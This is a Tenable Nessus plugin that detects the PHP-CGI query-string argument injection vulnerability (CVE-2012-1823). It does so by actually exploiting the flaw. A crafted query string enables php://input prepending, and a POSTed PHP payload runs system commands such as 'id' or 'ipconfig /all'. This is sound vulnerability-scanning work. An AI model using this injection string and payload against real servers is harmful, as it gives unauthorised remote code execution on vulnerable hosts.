#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59088);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/11/23 20:42:23 $");

  script_cve_id("CVE-2012-1823", "CVE-2012-2311");
  script_bugtraq_id(53388);
  script_osvdb_id(81633, 82213);
  script_xref(name:"CERT", value:"520827");
  script_xref(name:"EDB-ID", value:"18834");

  script_name(english:"PHP PHP-CGI Query String Parameter Injection Arbitrary Code Execution");
  script_summary(english:"Tests to execute arbitrary code");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a version of PHP that allows arbitrary
code execution.");
  script_set_attribute(attribute:"description", value:
"The PHP installation on the remote web server contains a flaw that
could allow a remote attacker to pass command-line arguments as part
of a query string to the PHP-CGI program.  This could be abused to
execute arbitrary code, reveal PHP source code, cause a system crash,
etc.");
  script_set_attribute(attribute:"see_also", value:"http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/");
  script_set_attribute(attribute:"see_also", value:"http://www.php.net/archive/2012.php#id2012-05-08-1");
  script_set_attribute(attribute:"see_also", value:"http://www.php.net/ChangeLog-5.php#5.3.13");
  script_set_attribute(attribute:"see_also", value:"http://www.php.net/ChangeLog-5.php#5.4.3");
  # https://www-304.ibm.com/connections/blogs/PSIRT/entry/security_bulletin_lotus_foundations_php_argument_command_injection_cve_2012_18234?lang=en_us
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?80589ce8");
  script_set_attribute(attribute:"see_also", value:"https://www-304.ibm.com/support/docview.wss?uid=swg21620314");
  script_set_attribute(attribute:"solution", value:
"If using Lotus Foundations, upgrade the Lotus Foundations operating
system to version 1.2.2b or later. 

Otherwise, upgrade to PHP 5.3.13 / 5.4.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PHP CGI Argument Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/05/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/05/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:php:php");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

os = get_kb_item("Host/OS");
files = get_kb_list("www/" + port + "/content/extensions/php*");

if (isnull(files)) file = "/index.php";
else
{
  files = make_list(files);
  file = files[0];
}

# Try to exploit the issue to run a command.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";


url = file + "?" +
    "-d allow_url_include=on "+
    "-d safe_mode=off "+
    "-d suhosin.simulation=on "+
    "-d open_basedir=off "+
    "-d auto_prepend_file=php://input " +
    "-n";
url = str_replace(find:" ", replace:"+", string:url);
url = urlencode(
  str:url, 
  unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/?+"
);
token = (SCRIPT_NAME - ".nasl") + "-" + unixtime();

foreach cmd (cmds)
{
  payload = "<?php echo '" + token + "'; system('" + cmd + "'); die; ?>";

  res = http_send_recv3(
    port         : port,
    method       : "POST",
    item         : url,
    data         : payload,
    content_type : "application/x-www-form-urlencoded",
    exit_on_fail : TRUE
  );

  if (
    token >< res[2] &&
    egrep(pattern:cmd_pats[cmd], string:res[2])
  )
  {
    if (report_verbosity > 0)
    {
      report = 
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
        '\n' + http_last_sent_request() +
        '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';

      if (report_verbosity > 1)
      {
        output = strstr(res[2], token) - token;

        report += 
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + 
          '\n' + chomp(output) + 
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
exit(0, "The web server listening on port " + port + " is not affected.");
